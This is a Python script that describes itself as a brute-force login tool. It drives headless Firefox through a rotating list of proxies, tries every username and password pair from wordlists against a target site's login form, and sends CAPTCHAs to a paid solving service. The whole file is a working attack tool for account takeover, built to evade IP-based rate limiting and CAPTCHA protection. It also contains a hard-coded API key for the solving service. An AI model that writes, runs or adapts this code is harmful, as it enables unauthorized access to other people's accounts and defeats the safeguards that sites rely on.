import os
import logging
import requests
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException
import random
import time

API_KEY = "b2d8853363a604425b32d2ee3030d193"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

driver_path = "/usr/local/bin/geckodriver"  # Update with the correct path to geckodriver

service = Service(driver_path)

options = Options()
options.add_argument('--headless')

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

def load_proxies(file_path):
    if not os.path.exists(file_path):
        logging.error(f"Proxy file '{file_path}' not found.")
        return []
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

def get_driver_with_proxy(proxy):
    # Specify the path to the Firefox profile
    profile_path = r'C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\y1uqp5mi.default'  # Update with the correct profile path
    
    # Set up Firefox options
    options = Options()
    options.set_preference('profile', profile_path)
    options.set_preference("network.proxy.type", 1)
    options.set_preference("network.proxy.http", proxy.split(":")[0])
    options.set_preference("network.proxy.http_port", int(proxy.split(":")[1]))
    options.set_preference("network.proxy.ssl", proxy.split(":")[0])
    options.set_preference("network.proxy.ssl_port", int(proxy.split(":")[1]))

    # Specify the path to the geckodriver
    service = Service(r'C:\WebDriver\bin\geckodriver.exe')  # Update with the correct path to geckodriver

    # Initialize the Firefox driver with the specified options and service
    driver = webdriver.Firefox(service=service, options=options)
    return driver

class LoginFailedException(Exception):
    pass

def find_login_fields(driver, url):
    driver.get(url)
    username_field = None
    password_field = None

    for name in ["username", "user", "email"]:
        try:
            username_field = driver.find_element(By.NAME, name)
            break
        except NoSuchElementException:
            continue
    if username_field is None:
        try:
            username_field = driver.find_element(By.CSS_SELECTOR, "input[type='text']")
        except NoSuchElementException:
            logging.error("Could not find the username field.")

    for name in ["password", "pass"]:
        try:
            password_field = driver.find_element(By.NAME, name)
            break
        except NoSuchElementException:
            continue
    if password_field is None:
        try:
            password_field = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
        except NoSuchElementException:
            logging.error("Could not find the password field.")

    return username_field, password_field

def solve_captcha(driver):
    captcha_image = driver.find_element(By.XPATH, '//img[@class="captcha-image"]')
    captcha_url = captcha_image.get_attribute('src')

    response = requests.post(
        "http://2captcha.com/in.php",
        data={
            'key': API_KEY,
            'method': 'base64',
            'body': captcha_url
        }
    )

    if response.text.startswith('OK|'):
        captcha_id = response.text.split('|')[1]
        logging.info(f"Captcha solved, ID: {captcha_id}")
        
        solution = requests.get(f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}")
        while solution.text == "CAPCHA_NOT_READY":
            logging.info("Waiting for CAPTCHA solution...")
            time.sleep(5)
            solution = requests.get(f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}")

        if solution.text.startswith("OK|"):
            captcha_answer = solution.text.split('|')[1]
            return captcha_answer
        else:
            logging.error(f"Failed to solve CAPTCHA: {solution.text}")
            return None
    else:
        logging.error(f"Failed to send CAPTCHA to 2Captcha: {response.text}")
        return None

def attempt_login(proxy, url, username, password):
    driver = get_driver_with_proxy(proxy)
    try:
        username_field, password_field = find_login_fields(driver, url)

        if username_field and password_field:
            username_field.send_keys(username)
            password_field.send_keys(password)

            captcha_answer = solve_captcha(driver)
            if captcha_answer:
                captcha_field = driver.find_element(By.NAME, "captcha")
                captcha_field.send_keys(captcha_answer)

            password_field.send_keys(Keys.RETURN)

            wait = WebDriverWait(driver, 10)
            try:
                wait.until(EC.presence_of_element_located((By.ID, "dashboard")))
                logging.info(f"Login successful for {username}:{password} using proxy {proxy}")
            except TimeoutException:
                logging.error(f"Login failed for {username}:{password} using proxy {proxy}")
    finally:
        driver.quit()

def main():
    parser = argparse.ArgumentParser(description="Brute force login script with proxy support.")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("usernames", help="Path to the usernames file")
    parser.add_argument("passwords", help="Path to the passwords file")
    args = parser.parse_args()

    proxies = load_proxies("proxy.txt")
    if not proxies:
        logging.error("No proxies loaded. Exiting.")
        return

    with open(args.usernames, 'r') as ufile, open(args.passwords, 'r') as pfile:
        usernames = [line.strip() for line in ufile if line.strip()]
        passwords = [line.strip() for line in pfile if line.strip()]

    for proxy in proxies:
        logging.info(f"Using proxy: {proxy}")
        for username in usernames:
            for password in passwords:
                attempt_login(proxy, args.url, username, password)

if __name__ == "__main__":
    main()
